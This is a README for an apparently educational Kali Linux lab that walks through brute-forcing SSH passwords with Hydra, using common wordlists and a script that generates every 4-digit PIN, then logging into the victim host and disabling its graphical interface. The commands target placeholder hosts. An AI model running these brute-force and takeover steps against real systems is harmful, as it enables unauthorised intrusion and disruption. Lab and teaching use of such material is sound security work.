# CyberSleuth-Exploring-Network-Security
---
##### This project is intended to run on Kali Linux virtual machine.
### Instructions
To connect physical machines using Kali Linux on VirtualBox, we had to ensure that the virtual machines have access to the same network. A bridged adapter in networking connects the virtual machine directly to the physical network, enabling it to appear as a distinct device on the network, sharing the host's IP address. Once the VMs are connected, the following steps can be followed.
### 1. Password Decryption with Hydra
#### Method 1: Alphanumerical Password Lists
We will use comprehensive collection of commonly used passwords, to aid in our password decryption efforts. fasttrack.txt and rockyou.txt are two popular password lists.

Navigate to this diectory:
```bash
cd /usr/share/wordlists
```
Run hydra to test different possible passwords.
```bash
hydra -l user -P fasttrack.txt ssh://target_ip -V -F
```
#### Method 2: Numerical Password Guessing
Generate all possible 4 digit passwords combinations with this python script
```python
with open("four_digit_combinations.txt", "w") as f:
   	for i in range(10000):
       	f.write("{:04d}\n".format(i))
```
Execute .py file in terminal
```bash
python four_digit_generator.py
```
Hydra brute-force attack
```bash
hydra -l user -P four_digit_combinations.txt -t 4 -V -o hydra_output.txt ssh://target_ip
```
### 2. Using SSH to Gain Control of a Host Computer
Once the attacker has obtained valid credentials, they can use SSH to connect to the target host computer. The command to initiate an SSH connection is:
```bash
ssh username@target_host
```
Upon connecting, SSH prompts for the password associated with the provided username. The attacker enters the obtained password.

### 3. Disabling the Graphical User Interface (GUI) 
Now that attacker has gained access to victim machine there is scope for damage.
To disable GUI temporarily:
```bash
sudo systemctl isolate multi-user.target
```
To enable the GUI temporarily:
```
sudo systemctl isolate graphical.target
```
